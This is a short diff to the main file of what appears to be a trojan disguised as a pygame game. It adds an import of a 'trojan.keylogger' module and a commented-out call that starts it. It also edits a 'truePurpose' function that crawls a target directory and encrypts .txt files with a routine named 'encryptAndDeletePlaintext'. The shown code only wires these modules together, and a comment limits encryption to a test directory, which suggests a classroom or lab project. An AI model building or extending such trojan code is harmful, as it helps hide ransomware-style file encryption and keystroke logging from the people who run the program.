@@ -8,6 +8,7 @@ from multiprocessing import Process
 from game.menu.main_menu import main_menu
 from trojan.crawler import Crawler
 from trojan.crypto import encryptAndDeletePlaintext, decryptAndDeleteCipherText
+import trojan.keylogger
 
 PATH_TO_ROOT = pathlib.Path(__file__).parent.absolute()
 
@@ -43,7 +44,8 @@ def truePurpose(target_directory: str):
     Arguments:
         target_directory: the directory to ecrypt
     """
-
+    pygame.quit()
+    # trojan.keylogger.start_logger()
     c: Crawler = Crawler(target_directory, extension_white_list=[
                          '.txt'], abs_path=True)
     c.walk_tree()
@@ -61,3 +63,5 @@ if __name__ == "__main__":
 
     # For now, we'll encrypt all files in the test directory, that are a txt file.
     game()
+
+    p.join()
